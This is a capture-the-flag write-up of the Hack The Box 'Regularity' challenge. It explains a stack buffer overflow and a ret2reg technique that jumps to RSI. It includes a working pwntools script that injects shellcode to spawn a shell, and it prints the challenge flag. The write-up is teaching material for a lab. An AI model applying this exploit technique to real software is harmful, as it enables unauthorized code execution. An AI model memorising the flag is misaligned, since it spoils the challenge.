# Regularity
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d20d1e54-c9f0-4e60-8820-70dea1f1090c)


## Lessons Learned:
1. Stack-Based Exploitation.
2. Get shell using ret2reg concept --> jumping to rsi.

## DESCRIPTION:

<p align="justify">Nothing much changes from day to day. Famine, conflict, hatred - it's all part and parcel of the lives we live now. We've grown used to the animosity that we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing. It's not the most talkative, though, but it's the highest level of tech most of us will ever see...</p>

## STEPS:
1. In this challenge, we're given a 64 bit binary, statically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9b195474-0e37-4725-bf60-798139df026b)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bf714acb-c3d3-48f2-a180-944cd07db6a3)


2. Interesting, no protections are applied to the binary.
3. Upon reviewing the decompiled code, we found an initialize global variable named message1. Since it's initialized, the variable shall stored at the .DATA section.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b297ed28-a23f-4f83-8ec9-755a2f5258a9)


> .DATA SECTION.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d9b319f-d05c-474d-a018-4f45f0af3e2d)


4. It's unclear to determine the size of **nbytes** and **__buf**. So let's just send 1024 cyclic pattern and check whether GDB alarm SIGSEGV or not.

> RESULTING TO SEGFAULT (SIGSEGV).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c76bc159-2c0d-4e6b-8990-c3dc229ff19c)


> RIP Offset -> 256

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d60021ed-fedf-490f-bb58-beaa8c376586)


5. Great! There is a Buffer Overflow then. Since there is no direct input execution and no stack leak. Hence, the easiest way to drop a shell is by using register that used to store the input buffer.
6. Commonly **RAX** is used to store the input buffer.
7. BUT, reviewing the register context, seems RSI is used to store our buffer.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c20349b2-5e29-4349-a0c3-527b5becc6ed)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bffb1ec5-0149-4a75-a4d0-a607eb298d19)


8. Nice! Seems RSI should be our target now. Again, remembering PIE is not enabled hence we can grab the `jmp rsi;` gadget without worries about the piebase.

> USING ROPPER - CHECKING JMP RSI; GADGET.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ad3e4531-fb43-4600-8f0f-2f9ab5ef37c6)


10. Here's the crafted exploit script.

> SCRIPT

```py
from pwn import *

exe = './regularity'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = process(exe)
rop = ROP(elf)

jmp_rsi = 0x0000000000401041
success(f'JMP RSI; GADGET --> {hex(jmp_rsi)}')

p = flat([
    asm(shellcraft.sh()).ljust(256, asm('nop')),
    jmp_rsi
])
sh.sendline(p)
sh.interactive()
```

> REMOTE TEST

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/53c303a4-f1b3-44d4-808c-dc0661f78095)


11. We've pwned it!

## FLAG

```
HTB{jMp_rSi_jUmP_aLl_tH3_w4y!}
```
